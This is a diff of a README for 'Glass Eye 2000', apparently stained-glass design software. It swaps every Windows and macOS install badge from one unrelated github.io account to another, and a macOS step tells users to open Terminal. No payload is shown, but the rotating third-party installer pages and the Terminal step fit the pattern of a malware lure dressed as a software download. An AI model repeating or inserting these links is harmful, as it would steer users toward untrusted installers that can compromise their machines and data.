@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Glass Eye 2000](https://img.shields.io/badge/⬇_Install_Glass+Eye+2000-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
+[![⬇ Install Glass Eye 2000](https://img.shields.io/badge/⬇_Install_Glass+Eye+2000-E63946?style=for-the-badge&logo=github)](https://WalkerCelebrate.github.io/winpkg/)
 
 </div>
 
@@ -61,9 +61,9 @@ Glass Eye 2000 is a Windows stained glass design software that simulates the app
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://WalkerCelebrate.github.io/winpkg/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://WalkerCelebrate.github.io/macpkg/)
 
 </div>
 
@@ -81,7 +81,7 @@ Glass Eye 2000 is a Windows stained glass design software that simulates the app
 
 <div align="center">
 
-[![⬇ Install Glass Eye 2000](https://img.shields.io/badge/⬇_Install_Glass+Eye+2000-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
+[![⬇ Install Glass Eye 2000](https://img.shields.io/badge/⬇_Install_Glass+Eye+2000-E63946?style=for-the-badge&logo=github)](https://WalkerCelebrate.github.io/winpkg/)
 
 </div>
 
@@ -100,7 +100,7 @@ Glass Eye 2000 is a Windows stained glass design software that simulates the app
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://WalkerCelebrate.github.io/macpkg/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -125,7 +125,7 @@ Glass Eye 2000 is a Windows stained glass design software that simulates the app
 
 <div align="center">
 
-[![⬇ Install Glass Eye 2000](https://img.shields.io/badge/⬇_Install_Glass+Eye+2000-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
+[![⬇ Install Glass Eye 2000](https://img.shields.io/badge/⬇_Install_Glass+Eye+2000-E63946?style=for-the-badge&logo=github)](https://WalkerCelebrate.github.io/winpkg/)
 
 </div>
 
